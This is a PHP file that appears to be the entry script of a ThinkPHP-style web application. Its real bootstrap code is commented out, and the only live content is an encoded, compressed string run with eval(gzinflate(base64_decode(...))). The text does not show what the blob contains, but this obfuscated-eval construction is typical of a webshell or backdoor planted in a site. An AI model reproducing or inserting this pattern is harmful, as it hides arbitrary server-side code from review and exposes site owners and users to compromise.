<?php
/*header('Content-type: text/html; charset=utf-8');
if (get_magic_quotes_gpc()) {
    function stripslashes_deep($value)
    {
        $value = is_array($value) ? array_map('stripslashes_deep', $value) : stripslashes($value);
        return $value;
    }
    $_POST = array_map('stripslashes_deep', $_POST);
    $_GET = array_map('stripslashes_deep', $_GET);
    //$_REQUEST = array_map('stripslashes_deep', $_REQUEST);
    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
}
define('APP_NAME', '');
define('CONF_PATH','./data/conf/');
define('TMPL_PATH','./tpl/');
define('HTML_PATH','./data/html/');
define('CORE','./');
$GLOBALS['_beginTime'] = microtime(TRUE);
define('MEMORY_LIMIT_ON',function_exists('memory_get_usage'));
if(MEMORY_LIMIT_ON) $GLOBALS['_startUseMems'] = memory_get_usage();
define('APP_PATH','./Nicedog/');
defined('APP_PATH') 	or define('APP_PATH', dirname($_SERVER['SCRIPT_FILENAME']).'/');
define('RUNTIME_PATH','./data/conf/logs/');
defined('RUNTIME_PATH') or define('RUNTIME_PATH',APP_PATH.'Runtime/');
define('APP_DEBUG',true);
defined('APP_DEBUG') 	or define('APP_DEBUG',false);
$runtime = defined('MODE_NAME')?'~'.strtolower(MODE_NAME).'_runtime.php':'~runtime.php';
defined('RUNTIME_FILE') or define('RUNTIME_FILE',RUNTIME_PATH.$runtime);

if(!APP_DEBUG && is_file(RUNTIME_FILE)) {
    require RUNTIME_FILE;
}else{
    defined('THINK_PATH') or define('THINK_PATH', dirname(__FILE__).'/');
    require THINK_PATH.'Common/runtime.php';
}*/


$content = "jVTbauMwEP0VLYTKhtR+XRJKSVM3MY0vOM7CUorQ2mNH4FslebehtN9e2YkTOw1s3yydc2bmzIy1BRoD1/C8LCQU8lruKpggCa/S3Mo8m6JoS7kAeVPL5Pon1qeIJUhLQZKcpiwiL3UpQZC0ijRdR28oqYtIsrJAQnJWiYyKrYJjgEob/aVZDQ1p/4VuEBOEck53R+wWtWcVvNLwlxB4jDriZJCg008RB1nz4kCbonc0Ir63DlWu/wVueSrCiCysb/EVraXPPe/Rtr6j2DP1pqwYElaAhme+T9yZYykcN93t7uee+0D8WbjEY2yYMZXUjMoiMfuc0PFXJ46ssgG6DJ3VWYRmouYwS2C1cHM5Wqy8u9lq/YTJH0hZEbIc8LPylbOIl1KdtDDYWD25Yzle8JusbMcOieficTd9Aq9MSKHhHPKS70izL7WgKWC93SDtTKn3kwtJudwIcCAX+/xnQbReCU3/jiZdFkFcpj2LcY+ho5Jf0KGY8YIqcyOytoJfVvCE1/PA9kPyYK+sdjbPuoEHfQs2bmg71qUBZWUqhgUMyIMihmG6kgwc1EXT7kHKBr237jYLPJa8XfWBwz30xeJBkdBMNJIR30dWTT2qHe/e2q+gfos/sKFWV5ZZ+U+9CkdI+ScHqVFtKzzBH/3jBbNN7y6bbZFx37rRlaVP1Wr8ONaNrq6aFyJhGWh9dfvQcHipGQfUB9SPBcro26mccGm7jxc637s/LQBpgxDSTbtLcSIb6p3M87Iwh+7fPwE=";

eval(gzinflate(base64_decode($content)));